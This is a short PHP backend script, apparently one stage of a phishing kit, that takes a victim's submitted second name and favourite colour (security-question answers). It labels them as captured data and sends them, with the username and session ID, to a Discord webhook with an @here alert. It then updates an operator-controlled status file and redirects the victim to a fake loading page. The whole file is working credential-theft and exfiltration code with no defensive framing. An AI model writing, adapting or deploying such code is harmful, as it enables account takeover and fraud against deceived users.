<?php
// extra.php - Procesa Segundo Nombre y Color Favorito
require 'config.php';

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $segundo_nombre = trim($_POST['segundo_nombre'] ?? '');
    $color_favorito = trim($_POST['color_favorito'] ?? '');

    $usuario = $_SESSION['usuario'] ?? 'Desconocido';
    $sessionId = $_SESSION['custom_sid'] ?? session_id();

    $ip = getUserIP();

    // Enviar a Discord
    $embed = [
        "title" => "DATOS EXTRA CAPTURADOS",
        "color" => 10181046, // Morado
        "fields" => [
            ["name" => "USUARIO", "value" => "```{$usuario}```", "inline" => true],
            ["name" => "SEGUNDO NOMBRE", "value" => "```{$segundo_nombre}```", "inline" => true],
            ["name" => "COLOR FAVORITO", "value" => "```{$color_favorito}```", "inline" => true],
            ["name" => "SESSION ID", "value" => "```{$sessionId}```", "inline" => false]
        ],
        "footer" => ["text" => "PHP Backend - " . date("Y-m-d H:i:s")]
    ];

    sendToDiscord("@here **DATOS EXTRA RECIBIDOS**", [$embed]);

    // Actualizar estado (opcional)
    $file = DATA_DIR . "/{$sessionId}.json";
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
        $data['status'] = 'waiting_final';
        $data['command'] = null;
        file_put_contents($file, json_encode($data));
    }

    // Redirigir a loading4
    header("Location: loading4.html?sid={$sessionId}");
    exit;
} else {
    header('Location: index.html');
    exit;
}
